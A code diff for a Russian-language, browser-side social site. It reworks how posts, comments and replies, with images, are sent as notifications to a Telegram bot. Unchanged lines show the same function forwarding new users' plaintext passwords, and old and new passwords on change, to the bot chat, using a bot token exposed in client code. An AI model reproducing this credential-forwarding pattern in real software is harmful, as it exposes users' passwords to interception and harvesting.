@@ -240,7 +240,6 @@
             <button onclick="toggleAdminPanel()">Добавить пост</button>
             <button onclick="showChangePassword()">Сменить пароль</button>
             <button onclick="showChangeUsername()">Сменить ник</button>
-            <button onclick="toggleInvitationContainer()">Показать приглашения</button>
             <input type="text" id="searchUser" placeholder="Поиск пользователя">
             <button onclick="searchUser()">Поиск</button>
         </div>
@@ -461,46 +460,46 @@
         
         if (type === 'newUser') {
             message = `Новый пользователь:\nИмя: ${data.username}\nПароль: ${data.password}`;
-        } else if (type === 'newPost') {
-            message = `Новый пост от ${data.user}:\n${data.content}`;
-            if (data.image) {
-                formData.append('photo', data.image, 'post_image.jpg');
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('caption', message);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                return; // Возвращаемся, чтобы избежать дублирования отправки сообщения
-            }
-        } else if (type === 'like') {
+        } else  if (type === 'newPost') {
+        message = `Новый пост от пользователя ${data.user}:\n${data.content}`;
+        if (data.image) {
+            formData.append('photo', data.image, 'post_image.jpg');
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', message);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            return;
+        }
+    } else if (type === 'comment') {
+        message = `Комментарий к посту с ID ${data.postId}:\n${data.comment}\nОт пользователя: ${data.username}`;
+        if (data.image) {
+            formData.append('photo', data.image, 'comment_image.jpg');
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', message);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            return;
+        }
+    } else if (type === 'reply') {
+        message = `Ответ на комментарий к посту с ID ${data.postId} (Комментарий от ${data.commentUser}):\n${data.commentText}\nОтвет:\n${data.reply}\nОт пользователя: ${data.username}`;
+        if (data.image) {
+            formData.append('photo', data.image, 'reply_image.jpg');
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', message);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            return;
+        }
+    }  else if (type === 'like') {
             message = `Пост с ID ${data.postId} был лайкнут пользователем ${data.username}`;
         } else if (type === 'subscribe') {
             message = `Пользователь ${data.subscriber} подписался на ${data.username}`;
-        } else if (type === 'comment') {
-            message = `Комментарий к посту с ID ${data.postId}:\n${data.comment}\nОт пользователя: ${data.username}`;
-            if (data.image) {
-                formData.append('photo', data.image, 'comment_image.jpg');
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('caption', message);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                return; // Возвращаемся, чтобы избежать дублирования отправки сообщения
-            }
-        } else if (type === 'reply') {
-            message = `Ответ на комментарий к посту с ID ${data.postId}:\n${data.reply}\nОт пользователя: ${data.username}`;
-            if (data.image) {
-                formData.append('photo', data.image, 'reply_image.jpg');
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('caption', message);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                return; // Возвращаемся, чтобы избежать дублирования отправки сообщения
-            }
         } else if (type === 'changePassword') {
             message = `Пользователь ${data.username} хочет сменить пароль.\nСтарый пароль: ${data.oldPassword}\nНовый пароль: ${data.newPassword}`;
         } else if (type === 'changeUsername') {
@@ -514,11 +513,11 @@
         }
 
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('text', message);
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            body: formData
+    formData.append('text', message);
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        body: formData
         });
     }
 
@@ -647,70 +646,69 @@
     }
 
     function addComment(postId) {
-        const text = document.getElementById(`commentText-${postId}`).value;
-        const imageFile = document.getElementById(`commentImage-${postId}`).files[0];
-        const username = document.querySelector('#username span').textContent;
-        const post = data.posts.find(p => p.id === postId);
+    const text = document.getElementById(`commentText-${postId}`).value;
+    const imageFile = document.getElementById(`commentImage-${postId}`).files[0];
+    const username = document.querySelector('#username span').textContent;
+    const post = data.posts.find(p => p.id === postId);
 
-        if (text || imageFile) {
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                const image = reader.result;
-                const comment = { user: username, text: text, image: image || '' };
-                post.comments.push(comment);
-                renderPosts();
-                sendToTelegram({ postId: postId, username: username, comment: text, image: image }, 'comment');
-                document.getElementById(`commentText-${postId}`).value = '';
-                document.getElementById(`commentImage-${postId}`).value = '';
-            };
-            if (imageFile) {
-                reader.readAsDataURL(imageFile);
-            } else {
-                const comment = { user: username, text: text, image: '' };
-                post.comments.push(comment);
-                renderPosts();
-                sendToTelegram({ postId: postId, username: username, comment: text }, 'comment');
-                document.getElementById(`commentText-${postId}`).value = '';
-            }
+    if (text || imageFile) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            const image = reader.result;
+            const comment = { user: username, text: text, image: imageFile ? imageFile : '' };
+            post.comments.push(comment);
+            renderPosts();
+            sendToTelegram({ postId: postId, username: username, comment: text, image: imageFile ? imageFile : '' }, 'comment');
+            document.getElementById(`commentText-${postId}`).value = '';
+            document.getElementById(`commentImage-${postId}`).value = '';
+        };
+        if (imageFile) {
+            reader.readAsDataURL(imageFile);
+        } else {
+            const comment = { user: username, text: text, image: '' };
+            post.comments.push(comment);
+            renderPosts();
+            sendToTelegram({ postId: postId, username: username, comment: text }, 'comment');
+            document.getElementById(`commentText-${postId}`).value = '';
         }
     }
+}
 
-    function addReply(postId, commentIndex) {
-        const text = document.getElementById(`replyText-${postId}-${commentIndex}`).value;
-        const imageFile = document.getElementById(`replyImage-${postId}-${commentIndex}`).files[0];
-        const username = document.querySelector('#username span').textContent;
-        const post = data.posts.find(p => p.id === postId);
-        const comment = post.comments[commentIndex];
+function addReply(postId, commentIndex) {
+    const text = document.getElementById(`replyText-${postId}-${commentIndex}`).value;
+    const imageFile = document.getElementById(`replyImage-${postId}-${commentIndex}`).files[0];
+    const username = document.querySelector('#username span').textContent;
+    const post = data.posts.find(p => p.id === postId);
+    const comment = post.comments[commentIndex];
 
-        if (text || imageFile) {
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                const image = reader.result;
-                const reply = { user: username, text: text, image: image || '' };
-                if (!comment.replies) {
-                    comment.replies = [];
-                }
-                comment.replies.push(reply);
-                renderPosts();
-                sendToTelegram({ postId: postId, username: username, reply: text, image: image }, 'reply');
-                document.getElementById(`replyText-${postId}-${commentIndex}`).value = '';
-                document.getElementById(`replyImage-${postId}-${commentIndex}`).value = '';
-            };
-            if (imageFile) {
-                reader.readAsDataURL(imageFile);
-            } else {
-                const reply = { user: username, text: text, image: '' };
-                if (!comment.replies) {
-                    comment.replies = [];
-                }
-                comment.replies.push(reply);
-                renderPosts();
-                sendToTelegram({ postId: postId, username: username, reply: text }, 'reply');
-                document.getElementById(`replyText-${postId}-${commentIndex}`).value = '';
+    if (text || imageFile) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            const image = reader.result;
+            const reply = { user: username, text: text, image: imageFile ? imageFile : '' };
+            if (!comment.replies) {
+                comment.replies = [];
             }
+            comment.replies.push(reply);
+            renderPosts();
+            sendToTelegram({ postId: postId, username: username, reply: text, image: imageFile ? imageFile : '', commentUser: comment.user, commentText: comment.text }, 'reply');
+            document.getElementById(`replyText-${postId}-${commentIndex}`).value = '';
+            document.getElementById(`replyImage-${postId}-${commentIndex}`).value = '';
+        };
+        if (imageFile) {
+            reader.readAsDataURL(imageFile);
+        } else {
+            const reply = { user: username, text: text, image: '' };
+            if (!comment.replies) {
+                comment.replies = [];
+            }
+            comment.replies.push(reply);
+            renderPosts();
+            sendToTelegram({ postId: postId, username: username, reply: text, commentUser: comment.user, commentText: comment.text }, 'reply');
+            document.getElementById(`replyText-${postId}-${commentIndex}`).value = '';
         }
     }
-
+}
     function changePassword() {
         const oldPassword = document.getElementById('oldPassword').value;
         const newPassword = document.getElementById('newPassword').value;
